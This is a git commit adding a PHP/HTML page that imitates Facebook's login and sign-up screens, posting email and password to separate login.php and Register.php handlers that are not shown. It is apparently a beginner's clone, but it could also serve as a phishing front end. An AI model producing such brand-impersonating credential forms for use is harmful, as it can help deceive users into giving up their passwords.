03842ad0ca6e78d1cda0297c8e54e4b59ffe39cb
sephcruz <31788580+sephcruz@users.noreply.github.com>
2017-09-30 14:55:22 +0800

    Create index.php

---
+++ index.php
@@ -0,0 +1,154 @@
+
+
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Facebook</title>
+	<link rel="stylesheet" href="style.css">
+	<link rel="icon" href="fb-art.png" sizes="32x32">
+</head>
+<body>
+
+
+<div id="header"> 
+		<div class="fb">facebook</div>
+		<div class="email"> 
+		<form method="post" action="login.php">
+		Email Or Phone </br>
+		<input type="text" name="email" </div></div>
+		
+		<div class="pass">Password</br> 
+		<input type="password" name="pword"></br>
+		Forgot Account?
+		</div>
+		
+		<div class="login">
+		<input type="submit" name="login" value="Log In">
+	</div>
+		
+</div>
+
+<div class="signup">
+	<div class="connect">Connect with friends and the</br>
+world around you on Facebook.</div>
+	
+	<div class="register">
+	Sign Up</br>
+	</div>
+	<div class="free">It’s free and always will be.</br>
+	<form method="post" action="Register.php">
+	<input type="text" name="Fname" placeholder="First Name" style=" height: 25%; width: 25%; ">
+	<input type="text" name="Lname" placeholder="Last Name"> </br>
+	<input type="text" name="email" placeholder="Mobile Number or Email"></br>
+	<input type="text" name="pword" placeholder="New Password"></br>
+	Birthday</br>
+			<select>
+				<option>Month</option>
+				<option>Jan</option>
+				<option>Feb</option>
+				<option>Mar</option>
+				<option>Apr</option>
+				<option>May</option>
+				<option>June</option>
+				<option>July</option>
+				<option>Aug</option>
+				<option>Sept</option>
+				<option>Oct</option>
+				<option>Nov</option>
+				<option>Dec</option>
+
+
+				</select>
+
+				<select>
+				<option>Day</option>
+				<option>1</option>
+				<option>2</option>
+				<option>3</option>
+				<option>4</option>
+				<option>5</option>
+				<option>6</option>
+				<option>7</option>
+				<option>8</option>
+				<option>9</option>
+				<option>10</option>
+				<option>11</option>
+				<option>12</option>
+				<option>13</option>
+				<option>14</option>
+				<option>15</option>
+				<option>16</option>
+				<option>17</option>
+				<option>18</option>
+				<option>19</option>
+				<option>20</option>
+				<option>21</option>
+				<option>22</option>
+				<option>23</option>
+				<option>24</option>
+				<option>25</option>
+				<option>26</option>
+				<option>27</option>
+				<option>28</option>
+				<option>29</option>
+				<option>30</option>
+				<option>31</option>
+				</select>
+				
+			
+				<select>
+				<option>Year</option>
+				<option>2016</option>
+				<option>2015</option>
+				<option>2014</option>
+				<option>2013</option>
+				<option>2012</option>
+				<option>2011</option>
+				<option>2010</option>
+				<option>2009</option>
+				<option>2008</option>
+				<option>2007</option>
+				<option>2006</option>
+				<option>2005</option>
+				<option>2004</option>
+				<option>2003</option>
+				<option>2002</option>
+				<option>2001</option>
+				<option>2000</option>
+				<option>1999</option>
+				<option>1998</option>
+				<option>1997</option>
+				<option>1996</option>
+				<option>1995</option>
+				<option>1994</option>
+				<option>1993</option>
+				<option>1992</option>
+				<option>1991</option>
+				<option>1990</option>
+				<option>1989</option>
+				<option>1987</option>
+				<option>1986</option>
+				<option>1985</option>
+				<option>1984</option>
+				<option>1983</option>
+				<option>1982</option>
+				<option>1981</option>
+				<option>1980</option>
+
+				</select></br>
+
+				<input type="radio" name="male">Male
+				<input type="radio" name="female">Female</br>
+				
+				By clicking sign up, You agree to our terms and that you have<br>read our Data policy, including our cookie use.You may </br>
+				receive SMS Notifications from Facebook and can opt out at any </br>time.</p>
+		<button style="background-color:green;border: solid; border-radius:5px; color: white; padding: 10px 28px; text-align: center;font-size: 16px;">Create Account</button>
+	</div>
+	</form>
+	
+	
+
+
+</div>
+</body>
+</html>
